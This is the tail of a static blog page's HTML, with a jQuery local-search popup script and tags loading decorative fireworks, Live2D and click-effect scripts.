      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>

